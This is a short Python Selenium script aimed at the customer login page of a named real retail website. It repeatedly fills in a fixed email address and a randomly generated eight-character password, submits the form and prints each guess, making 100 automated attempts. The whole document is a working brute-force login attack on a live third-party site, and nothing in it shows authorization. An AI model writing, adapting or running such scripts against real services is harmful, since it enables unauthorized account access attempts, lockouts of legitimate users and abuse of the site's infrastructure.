import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver =  webdriver.Chrome('C:\Selenium\chromedriver.exe') 
driver.get("https://www.ebest.cl/customer/account/login/")
time.sleep(5)
letters_n_digits = string.ascii_lowercase + string.digits
for x in range(100):
    usr = driver.find_element_by_id("email")
    usr.clear()
    usr.send_keys("fake0290.3@yahoo.com")
    psw = driver.find_element_by_id("pass")
    str = ''.join(random.choice(letters_n_digits) for i in range(8)) + '@'
    psw.send_keys(str)
    i = "{}".format(x)
    print(i + ": " + str)
    clk = driver.find_element_by_id("send2").click()
    